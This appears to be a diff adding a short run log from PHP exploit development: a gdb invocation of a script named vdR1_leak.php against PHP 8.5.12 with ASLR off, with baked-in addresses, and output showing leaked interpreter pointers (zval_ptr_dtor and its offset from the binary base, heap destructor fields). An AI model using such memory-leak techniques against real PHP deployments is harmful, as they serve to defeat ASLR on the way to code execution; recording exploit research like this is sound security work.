@@ -1,0 +1,8 @@
+== vdR1_leak receipt: plain2 8.5.12, gdb (ASLR off), argv=CHUNK/BASE/D baked from discovery ==
+cmd: gdb --args php -n vdR1_leak.php 0140737308794880 0093824990838784 0140737308729344
+LEAK1 EG(symbol_table).pDestructor = 0x555555b22310  (= zval_ptr_dtor, base+0x722310)
+LEAK2 d->first_dtor = 0x7ffff54c4000
+LEAK3 d->last       = 0x7ffff54c2000
+outer ok=bool(true)
+SURVIVED
+[Inferior 1 (process 1214223) exited normally]
